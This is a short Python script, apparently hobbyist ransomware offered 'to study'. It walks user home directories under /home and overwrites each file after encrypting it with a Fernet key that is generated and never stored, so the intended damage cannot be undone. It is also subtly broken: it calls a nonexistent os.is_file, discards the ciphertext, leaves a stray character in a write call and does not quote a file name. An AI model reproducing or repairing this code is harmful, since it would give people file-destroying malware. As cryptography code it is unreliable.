from cryptography.fernet import Fernet
import os

"""

First of all this code is just to study about cryptography, 
and about ransomware, dont run this code in your own computer,
because there's no turn back after running one time the key is lost,
if you want to run in your own computer save the key in a files using this code bellow

but first create a file call "key.txt" on directory

with open(key.txt, 'wb') as keyfile:
	keyfile.write(key)


"""
key = Fernet.generate_key();

def destruction_derby(arr):
	content = ''
	for y in arr: 
		if os.is_file(y):
			with open(y, 'rb') as encrypt:
				content = encrypt.read()
			
			Fernet(key).encrypt(content)
			with open(y, 'wb') as encrypted:
				encrypted´.write(content)
	return True


os.chdir('/home/')
destruct_location = []
files_list = []
for file in os.listdir():
	print(f'/home/{file}')
	destruct_location.append(f'/home/{file}') 
	os.chdir(f'/home/{file}')
	for x in os.listdir():
		if x == 'cryptlist.py' or file == 'key.py':
			continue
		files_list.append(x)
	destruction_derby(files_list)




"""
Authors: Mohamed Bin Sala & Thalis Fernandes
"""